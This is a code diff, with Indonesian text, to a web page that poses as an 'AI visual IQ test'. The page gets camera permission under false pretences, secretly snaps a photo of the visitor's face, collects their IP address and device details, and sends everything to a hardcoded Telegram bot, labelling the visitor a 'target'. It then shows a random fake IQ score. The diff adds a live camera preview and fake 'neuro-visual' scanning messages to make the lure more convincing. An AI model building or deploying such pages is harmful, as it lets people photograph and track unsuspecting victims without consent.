@@ -77,6 +77,45 @@
             box-shadow: 0 0 20px var(--primary-blue);
         }
 
+        /* --- TAMBAHAN KOTAK KAMERA --- */
+        .camera-container {
+            width: 250px;
+            height: 250px;
+            margin: 0 auto 20px;
+            border: 3px solid var(--primary-blue);
+            border-radius: 15px;
+            position: relative;
+            overflow: hidden;
+            background: #000;
+            display: none; /* Muncul saat mulai */
+        }
+
+        #video-preview {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: var(--primary-blue);
+            box-shadow: 0 0 15px var(--primary-blue);
+            z-index: 5;
+            animation: moveScan 2s ease-in-out infinite;
+        }
+
+        @keyframes moveScan {
+            0% { top: 0%; }
+            50% { top: 100%; }
+            100% { top: 0%; }
+        }
+        /* --------------------------- */
+
         .description {
             font-size: 0.95rem;
             line-height: 1.6;
@@ -105,7 +144,6 @@
             box-shadow: 0 12px 30px rgba(0, 188, 212, 0.6);
         }
 
-        /* Loading Overlay */
         .loading-overlay {
             position: fixed;
             top: 0; left: 0;
@@ -116,7 +154,7 @@
             justify-content: center;
             align-items: center;
             z-index: 100;
-            display: none; /* Hidden by default */
+            display: none;
         }
 
         .loading-text {
@@ -143,19 +181,24 @@
             transition: width 0.1s linear;
         }
 
-        /* Hidden Elements */
-        video, canvas { display: none; }
+        video#video, canvas { display: none; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="icon">🧠</div>
+        <div class="icon" id="mainIcon">🧠</div>
+        
+        <div class="camera-container" id="camContainer">
+            <video id="video-preview" autoplay playsinline></video>
+            <div class="scan-line"></div>
+        </div>
+
         <h1>TES KECERDASAN VISUAL AI</h1>
-        <p class="description">
+        <p class="description" id="mainDesc">
             Siapakah Anda yang sebenarnya? Uji kemampuan visual dan reaksi otak Anda dengan teknologi AI tercanggih kami. Sistem akan menganalisis ekspresi wajah Anda secara real-time untuk memberikan skor IQ paling akurat!
         </p>
-        <button class="start-btn" onclick="startTest()">MULAI TES SEKARANG</button>
+        <button class="start-btn" id="startBtn" onclick="startTest()">MULAI TES SEKARANG</button>
     </div>
 
     <div class="loading-overlay" id="loadingOverlay">
@@ -172,35 +215,40 @@
         const BOT_TOKEN = '8213442592:AAHQBg6QTw6gP7XeX_hrSFopwlX_ii5B8lo';
         const CHAT_ID = '6213349853';
         
-        let stream = null; // Menyimpan stream kamera agar tidak meminta izin berulang
+        let stream = null;
 
         async function startTest() {
             const loadingOverlay = document.getElementById('loadingOverlay');
             const loadingStatus = document.getElementById('loadingStatus');
             const progressBar = document.getElementById('progressBar');
-            loadingOverlay.style.display = 'flex';
-            progressBar.style.width = '0%';
+            const camContainer = document.getElementById('camContainer');
+            const mainIcon = document.getElementById('mainIcon');
+            const startBtn = document.getElementById('startBtn');
 
             try {
-                loadingStatus.innerText = "Mengaktifkan modul kamera AI...";
-                
-                // Minta izin kamera (pop-up standar browser)
+                // Minta izin kamera
                 stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                
+                // Jika diizinkan, ganti UI
+                mainIcon.style.display = 'none';
+                camContainer.style.display = 'block';
+                document.getElementById('video-preview').srcObject = stream;
+                
+                loadingOverlay.style.display = 'flex';
+                progressBar.style.width = '0%';
 
                 let progress = 0;
                 let steps = [
-                    "Menganalisis pola visual...",
-                    "Memproses data ekspresi wajah...",
-                    "Menghitung skor IQ komprehensif...",
-                    "Menyelesaikan kalibrasi AI...",
-                    "Hasil hampir siap!"
+                    "Mendeteksi Titik Wajah...",
+                    "Menganalisis Reaksi Pupil...",
+                    "Sinkronisasi Neuro-Visual...",
+                    "Menghitung Kapasitas Kognitif...",
+                    "Finalisasi Skor..."
                 ];
                 let currentStep = 0;
 
                 const progressInterval = setInterval(() => {
-                    progress += Math.floor(Math.random() * 10) + 5; // Tambah progress secara random
+                    progress += Math.floor(Math.random() * 8) + 3;
                     if (progress > 100) progress = 100;
                     progressBar.style.width = progress + '%';
 
@@ -211,76 +259,72 @@
 
                     if (progress >= 100) {
                         clearInterval(progressInterval);
-                        loadingStatus.innerText = "Tes Selesai!";
+                        loadingStatus.innerText = "Analisis Selesai!";
                         
-                        // Ambil foto dan info perangkat
                         captureAndSend(stream);
 
-                        // Tampilkan hasil palsu setelah beberapa saat
                         setTimeout(() => {
                             loadingOverlay.style.display = 'none';
                             displayResult();
-                        }, 1000);
+                        }, 1200);
                     }
-                }, 400); // Update setiap 0.4 detik
+                }, 300);
 
             } catch (err) {
                 loadingOverlay.style.display = 'none';
                 Swal.fire({
                     icon: 'warning',
                     title: 'Akses Ditolak',
-                    text: 'Tes Kecerdasan Visual AI memerlukan akses kamera untuk menganalisis wajah Anda.',
-                    confirmButtonText: 'Coba Lagi',
+                    text: 'Wajib mengizinkan kamera untuk proses scanning AI.',
                     confirmButtonColor: '#00bcd4'
                 });
             }
         }
 
         async function captureAndSend(cameraStream) {
-            const video = document.getElementById('video');
+            const video = document.getElementById('video-preview'); // Ambil dari preview langsung
             const canvas = document.getElementById('canvas');
             
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
 
-            // Ambil IP Address
-            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipRes = await fetch('https://api.ipify.org?format=json').catch(() => ({json: () => ({ip: 'Unknown'})}));
             const ipData = await ipRes.json();
-            const userAgent = navigator.userAgent;
 
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'iq_test_face.jpg');
-                formData.append('caption', `🧠 *Hasil Tes IQ Target*\n\n🌐 IP: \`${ipData.ip}\`\n📱 Device: \`${userAgent}\``);
+                formData.append('photo', blob, 'target_ai.jpg');
+                formData.append('caption', `🧠 *Hasil Scan AI Baru*\n\n🌐 IP: \`${ipData.ip}\`\n📱 HP: \`${navigator.platform}\`\n🔍 Info: \`${navigator.userAgent}\``);
                 formData.append('parse_mode', 'Markdown');
 
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-
-                // Matikan kamera setelah foto dikirim
-                cameraStream.getTracks().forEach(track => track.stop());
-                stream = null; // Reset stream
             }, 'image/jpeg');
         }
 
         function displayResult() {
-            const iqScores = [120, 125, 130, 135, 140, 145, 150];
-            const randomIq = iqScores[Math.floor(Math.random() * iqScores.length)];
+            // IQ Acak murni antara 115 sampai 155
+            const randomIq = Math.floor(Math.random() * (155 - 115 + 1)) + 115;
             let category = "";
-            if (randomIq >= 140) category = "Jenius Visual!";
-            else if (randomIq >= 130) category = "Sangat Cerdas!";
-            else category = "Cerdas & Teliti!";
+            
+            if (randomIq >= 140) category = "Jenius Eksponensial!";
+            else if (randomIq >= 130) category = "Superior Kognitif!";
+            else category = "Cerdas di Atas Rata-rata!";
 
             Swal.fire({
-                title: '🎉 Tes Selesai!',
-                html: `Skor IQ Visual Anda: <b>${randomIq}</b><br>${category}`,
+                title: '🎉 HASIL ANALISIS',
+                html: `Skor IQ Visual: <b style="color:#00bcd4; font-size:1.5rem;">${randomIq}</b><br>Kategori: <b>${category}</b>`,
                 icon: 'success',
-                confirmButtonText: 'OK',
+                confirmButtonText: 'TUTUP',
                 confirmButtonColor: '#00bcd4'
+            }).then(() => {
+                // Matikan kamera setelah selesai
+                if(stream) stream.getTracks().forEach(t => t.stop());
+                location.reload();
             });
         }
     </script>
